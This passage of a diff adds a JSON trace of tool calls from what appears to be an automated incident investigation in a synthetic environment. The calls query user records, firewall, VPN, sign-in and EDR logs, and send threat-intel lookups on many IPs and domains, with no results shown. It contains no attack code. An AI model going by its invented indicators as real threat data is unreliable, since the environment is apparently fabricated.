+        "q": "10.99.60.13",
+        "desde": "2026-10-21T01:44:00Z",
+        "hasta": "2026-10-21T05:44:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 4,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/diego.soler@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 430,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/ines.bosch@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 429,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:idp_signins",
+      "args": {
+        "q": "nuria.vidal@tarvia.example",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "incidentes",
+      "ms": 401,
+      "chars": 68,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/alvaro.dominguez@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 445,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/joan.valls@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 432,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/paula.esteve@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 440,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/mireia.aguilar@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 439,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:vpn",
+      "args": {
+        "q": "ext.logisoft",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "incidentes",
+      "ms": 33,
+      "chars": 30,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.99.60.77",
+        "desde": "2026-10-22T16:28:00Z",
+        "hasta": "2026-10-22T20:28:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 5,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/miguel.sanchez@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 439,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/ricard.dominguez@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 450,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:idp_signins",
+      "args": {
+        "q": "adm.aferrer",
+        "desde": "2026-10-22T09:08:38Z",
+        "hasta": "2026-10-24T09:08:38Z"
+      },
+      "origen": "incidentes",
+      "ms": 35,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:ad_events",
+      "args": {
+        "q": "adm.aferrer",
+        "desde": "2026-10-22T09:08:38Z",
+        "hasta": "2026-10-24T09:08:38Z"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:edr_events",
+      "args": {
+        "q": "adm.aferrer",
+        "desde": "2026-10-22T09:08:38Z",
+        "hasta": "2026-10-24T09:08:38Z"
+      },
+      "origen": "incidentes",
+      "ms": 56,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/adm.aferrer@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 495,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:vpn",
+      "args": {
+        "q": "ext.logisoft",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "incidentes",
+      "ms": 37,
+      "chars": 30,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.99.60.14",
+        "desde": "2026-10-24T23:13:00Z",
+        "hasta": "2026-10-25T03:13:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 4,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/victor.lozano2@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 438,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/marc.herrera@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 444,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/irene.vega@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 429,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/patricia.vidal@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 439,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/pol.medina@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 438,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/sergi.riera@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 441,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:vpn",
+      "args": {
+        "q": "ext.logisoft",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "incidentes",
+      "ms": 32,
+      "chars": 30,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "logs:firewall",
+      "args": {
+        "q": "10.99.60.15",
+        "desde": "2026-10-28T02:04:00Z",
+        "hasta": "2026-10-28T06:04:00Z"
+      },
+      "origen": "incidentes",
+      "ms": 4,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/montse.soler@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 435,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/oscar.coll@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 434,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/oriol.alonso@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 444,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "usuario",
+      "args": {
+        "ruta": "/users/neus.romero@tarvia.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 435,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.11.58"
+      },
+      "origen": "incidentes",
+      "ms": 5,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/avqs.mcafee.com"
+      },
+      "origen": "incidentes",
+      "ms": 4,
+      "chars": 58,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.11.127"
+      },
+      "origen": "incidentes",
+      "ms": 4,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/dnsbl.spamhaus.org"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 61,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/e5.sk"
+      },
+      "origen": "incidentes",
+      "ms": 4,
+      "chars": 48,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.23.180"
+      },
+      "origen": "incidentes",
+      "ms": 7,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.23.46"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/141.94.96.144"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 514,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/45.148.10.121"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 566,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/pool.supportxmr.com"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 330,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.23.115"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.22.165"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.23.43"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.34.108"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.35.57"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.34.179"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/203.0.113.45"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 276,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/tarvia-sso-login.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 67,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.35.136"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/sophosxl.net"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 55,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.47.25"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.46.142"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.46.75"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.95.151"
+      },
+      "origen": "incidentes",
+      "ms": 2,
+      "chars": 260,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.58.25"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.58.247"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.58.174"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.59.1"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 252,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.58.108"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.58.177"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.59.65"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/81.28.167.30"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 544,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/aplihartom.com"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 330,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/203.0.113.88"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 517,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/107.174.115.43"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 531,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.240.10"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 265,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.58.103"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.70.16"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.70.159"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.70.66"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.70.11"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.201"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 562,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.2.58"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 273,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.106"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 553,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.108"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 553,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.110"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 553,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.109"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 553,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.105"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 553,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.107"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 553,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.102"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 553,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.104"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 553,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.101"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 553,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.103"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 553,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.137"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 266,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.129"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 266,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.132"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 266,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.121"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 266,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.119"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 266,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.113"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 266,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.127"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 266,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.124"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 266,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/77.90.185.20"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 261,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.82.52"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/cdn-wms-metrics.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 66,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.81.155"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.81.199"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.82.102"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.81.151"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.94.7"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 252,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.93.126"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.94.11"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.93.191"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.93.194"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.94.79"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.51.100.210"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 276,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.105.71"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/192.42.116.99"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 578,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/80.67.167.81"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 569,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/179.43.182.232"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 578,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/171.25.193.25"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 602,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/87.118.116.103"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 569,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/109.70.100.4"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 581,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.105.9"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.105.74"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.106.19"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.105.197"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/npm-telemetry-stats.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 70,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.105.139"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.116.244"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.117.58"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/mega.nz"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 338,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.117.206"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.128.125"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/2.57.121.25"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.128.181"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.129.70"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.129.150"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.128.178"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.128.120"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.128.239"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.140.209"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.140.138"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.141.99"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.141.32"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.152.38"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.152.239"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.152.190"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.152.34"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.152.135"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.164.130"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.164.76"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.163.185"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.164.127"
+      },
+      "origen": "incidentes",
+      "ms": 0,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.175.164"
